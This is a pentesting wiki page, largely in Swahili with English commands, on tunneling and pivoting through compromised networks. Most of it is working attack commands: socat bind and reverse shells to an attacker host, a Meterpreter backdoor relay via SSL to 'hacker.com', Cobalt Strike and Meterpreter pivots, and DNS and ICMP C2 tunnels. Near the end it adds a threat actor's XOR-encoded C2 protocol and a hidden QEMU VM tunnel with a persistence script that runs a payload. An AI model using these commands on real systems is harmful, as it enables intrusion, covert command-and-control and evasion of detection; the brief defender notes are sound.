# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap kidokezo

> [!WARNING]
> **ICMP** na **SYN** scans haiwezi kupitishwa kupitia socks proxies, kwa hivyo tunapaswa **kuzima ping discovery** (`-Pn`) na kubainisha **TCP scans** (`-sT`) ili hii ifanye kazi.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH muunganisho wa grafiki (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Fungua Port mpya kwenye SSH Server --> Port nyingine
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port ya ndani --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Popote
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii inasaidia kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi host yako:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Unahitaji **root kwenye vifaa vyote viwili** (kwa kuwa utaunda new interfaces) na sshd config inapaswa kuruhusu root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Wezesha forwarding upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka njia mpya upande wa mteja
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> Shambulio la downgrade la Terrapin la 2023 linaweza kumruhusu man-in-the-middle kubadilisha early SSH handshake na kuingiza data ndani ya **any forwarded channel** (`-L`, `-R`, `-D`). Hakikisha client na server zimesasishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au zima waziwazi algoritimu hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.

## SSHUTTLE

Unaweza **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
Kwa mfano, forwarding all the traffic going to 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha kwa ufunguo wa kibinafsi
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Fungua port kwenye teamserver ikisikiliza kwenye interfaces zote, ili itumike **kupitisha trafiki kupitia beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika kesi hii, **port imefunguliwa kwenye beacon host**, sio katika Team Server na trafiki inatumwa kwa Team Server na kutoka huko hadi host:port iliyoonyeshwa
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Kumbuka:

- Beacon's reverse port forward imeundwa ili **kupitisha trafiki kwa Team Server, si kwa kupeleka kati ya mashine binafsi**.
- Trafiki imepitishwa ndani ya Beacon's C2, ikijumuisha viungo vya P2P.
- **Admin privileges are not required** ili kuunda reverse port forwards kwenye port za juu.

### rPort2Port local

> [!WARNING]
> Katika kesi hii, **port imefunguliwa katika beacon host**, si kwenye Team Server na **trafiki inatumwa kwa Cobalt Strike client** (si kwa Team Server) na kutoka huko kwenda host:port iliyoonyeshwa
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Unahitaji kupakia tunnel ya faili ya wavuti: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel]\
Unahitaji kutumia **toleo lilezile kwa client na server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Tumia toleo sawa kwa agent na proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent: Kuunganisha na Kusikiliza
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Kufikia bandari za ndani za Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunnel inaanzishwa kutoka kwa mdhuriwa.\
Proxy ya socks4 inaundwa kwenye 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kuepuka **non-authenticated proxy** kwa kutekeleza mstari huu badala ya ule wa mwisho kwenye console ya mwathirika:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Tengeneza certificates kwa pande zote: Client na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha port ya ndani ya SSH (22) na port 443 ya attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Ni kama toleo la console la PuTTY (chaguzi ni karibu mno na za ssh client).

Kwa kuwa binary hii itatekelezwa kwenye mwanaathiriwa na ni ssh client, tunahitaji kufungua ssh service na port yetu ili tuwe na reverse connection. Kisha, ili kuforward port inayopatikana kwa localhost pekee kwenda port kwenye mashine yetu:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Unahitaji kuwa local admin (kwa port yoyote)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **RDP access kwenye mfumo**.\
Pakua:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii inatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Katika kompyuta ya mteja pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** na **mwathirika** kupitia **RDP** tukitumia **`mstsc.exe`**, na tunapaswa kupokea **taarifa** inayosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **ikisikiliza** kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP** na upakishe & utekeleze kwenye mashine ya mwathirika binary ya `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kuproxy trafiki kupitia port hiyo.**

## Proxify Windows GUI Apps

Unaweza kufanya Windows GUI apps zipitie kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
Katika **Profile -> Proxy Servers** ongeza IP na port ya SOCKS server.\
Katika **Profile -> Proxification Rules** ongeza jina la programu unayotaka proxify pamoja na muunganisho kwa IPs unazotaka proxify.

## NTLM proxy bypass

Chombo kilichotajwa hapo juu: **Rpivot**\
**OpenVPN** pia inaweza ku-bypass, kwa kuweka chaguzi hizi katika faili ya configuration:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Inathibitisha dhidi ya proxy na ina-bind port kwa localhost ambayo ina-forward kwa huduma ya nje uliyobainisha. Kisha, unaweza kutumia tool unayochagua kupitia port hii.\
Kwa mfano, hiyo ina-forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, kwa mfano ikiwa utaweka kwenye victim huduma ya **SSH** isikie kwenye port 443. Unaweza kuunganisha nayo kupitia attacker port 2222.\  
Unaweza pia kutumia **meterpreter** inayounganisha kwa localhost:443 na attacker anasikiliza kwenye port 2222.

## YARP

A reverse proxy iliyotengenezwa na Microsoft. Unaweza kuiipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kutunelisha data kati yao kwa kutumia DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tuneli hiyo itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH uliobanwa kupitia tuneli hiyo kwa kutumia:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Inaunda chaneli ya C\&C kupitia DNS. Haihitaji root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha mteja wa dnscat2 katika powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding na dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains inazuia wito wa `gethostbyname` wa libc na kutunelisha ombi la tcp DNS kupitia socks proxy. Kwa **default** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imehardcoded). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na badilisha IP. Ikiwa uko katika **Windows environment** unaweza kuweka IP ya **domain controller**.

## Tuneli katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS mode (AK47DNS)**
• Generates a random 5-character SessionID (e.g. `H4T14`).
• Prepends `1` for *task requests* or `2` for *results* and concatenates different fields (flags, SessionID, computer name).
• Each field is **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, and glued together with dots – finally ending with the attacker-controlled domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.
• When the response exceeds 0xFF bytes the backdoor **fragments** the data into 63-byte pieces and inserts the markers:
`s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.

2. **HTTP mode (AK47HTTP)**
• Builds a JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• The whole blob is XOR-`VHBD@H` → hex → sent as the body of a **`POST /`** with header `Content-Type: text/plain`.
• The reply follows the same encoding and the `cmd` field is executed with `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Look for unusual **TXT queries** whose first label is long hexadecimal and always end in one rare domain.
• A constant XOR key followed by ASCII-hex is easy to detect with YARA: `6?56484244?484` (`VHBD@H` in hex).
• For HTTP, flag text/plain POST bodies that are pure hex and multiple of two bytes.

{{#note}}
Kanal nzima inafaa ndani ya **standard RFC-compliant queries** na inahifadhi kila lebo ya sub-domain chini ya 63 bytes, ikifanya iwe ya utapeli katika nyingi za DNS logs.
{{#endnote}}

## Tuneli za ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root inahitajika katika pande zote mbili ili kuunda tun adapters na kutunelisha data kati yao kwa kutumia ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ni zana ya kufichua huduma mtandaoni kwa amri moja.**\
_URI za kuonyesha ni kama:_ **UID.ngrok.io**

### Usakinishaji

- Unda akaunti: https://ngrok.com/signup
- Pakua client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Inawezeshwa pia kuongeza authentication na TLS, ikiwa inahitajika._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kwa HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing miito ya HTTP

_Inafaa kwa XSS,SSRF,SSTI ..._\
Moja kwa moja kutoka stdout au katika kiolesura ya HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling huduma ya ndani ya HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml mfano rahisi wa usanidi

Inafungua tuneli 3:

- 2 TCP
- 1 HTTP inayoonyesha faili za statiki kutoka /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Daemon ya `cloudflared` ya Cloudflare inaweza kuunda outbound tunnels zinazofichua **local TCP/UDP services** bila kuhitaji inbound firewall rules, ikitumia edge ya Cloudflare kama eneo la kukutanisha. Hii ni muhimu sana wakati firewall ya egress inaruhusu tu trafiki ya HTTPS lakini miunganisho inayoingia imezuiwa.

### Mstari mmoja wa haraka wa tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Persistent tunnels na DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anzisha kiunganishi:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni Go reverse-proxy inayodumishwa kikamilifu ambayo inaunga mkono **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Kuanzia **v0.53.0 (May 2024)** inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo host lengwa inaweza kuanzisha reverse tunnel kwa kutumia tu stock OpenSSH client – hakuna binary ya ziada inahitajika.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia SSH gateway mpya (bila frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri hapo juu inachapisha port ya mwathiri **8080** kama **attacker_ip:9000** bila kupeleka zana yoyote ya ziada – inafaa kwa living-off-the-land pivoting.

## Tunnel za siri za VM na QEMU

Mitandao ya user-mode ya QEMU (`-netdev user`) ina chaguo linaloitwa `hostfwd` ambalo **huunganisha port ya TCP/UDP kwenye *host* na kuisogeza ndani ya *guest***.  Iwapo *guest* inaendesha daemon kamili ya SSH, sheria ya `hostfwd` inakupa disposable SSH jump box inayokaa kabisa ndani ya VM ya muda – kamili kwa kuficha trafiki ya C2 kutoka kwa EDR kwa sababu shughuli zote zenye madhara na faili zinabaki kwenye virtual disk.

### Mstari mmoja wa haraka
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri iliyo hapo juu inaendesha picha ya **Tiny Core Linux** (`tc.qcow2`) ndani ya RAM.
• Bandari **2222/tcp** kwenye mwenyeji wa Windows imeelekezwa kwa uwazi kwenda **22/tcp** ndani ya mgeni.
• Kutoka kwa mtazamo wa mshambuliaji, lengo linaonyesha tu bandari 2222; vifurushi vyovyote vinavyofika vinashughulikiwa na SSH server inayokimbia kwenye VM.

### Kuzindua kwa siri kupitia VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the skripti with `cscript.exe //B update.vbs` kunafanya dirisha lifichwe.

### Udumu ndani ya VM

Kwa sababu Tiny Core haina hali ya kudumu, washambuliaji kwa kawaida hufanya:

1. Weka payload kwenye `/opt/123.out`
2. Ongeza kwenye `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ongeza `home/tc` na `opt` ndani ya `/opt/filetool.lst` ili payload ifungwe ndani ya `mydata.tgz` wakati wa kuzima.

### Kwa nini hili linaepuka utambuzi

• Ni tu executables mbili zisizosainiwa (`qemu-system-*.exe`) zinagusa diski; hakuna drivers au services zimewekwa.  
• Vifaa vya usalama kwenye mashine mwenyeji vinaona **trafiki ya loopback isiyo hatari** (C2 halisi inamalizika ndani ya VM).  
• Memory scanners hazichambui nafasi ya mchakato mbaya kwa sababu iko katika OS tofauti.

### Vidokezo kwa walinzi

• Weka onyo juu ya **binaries zisizotarajiwa za QEMU/VirtualBox/KVM** katika user-writable paths.  
• Zuia muunganisho wa kutoka nje yanayotokana na `qemu-system*.exe`.  
• Chunguza ports adimu za kusikiliza (2222, 10022, …) zinazofungamana mara moja baada ya uzinduzi wa QEMU.

---

## Zana nyingine za kukagua

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Marejeo

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
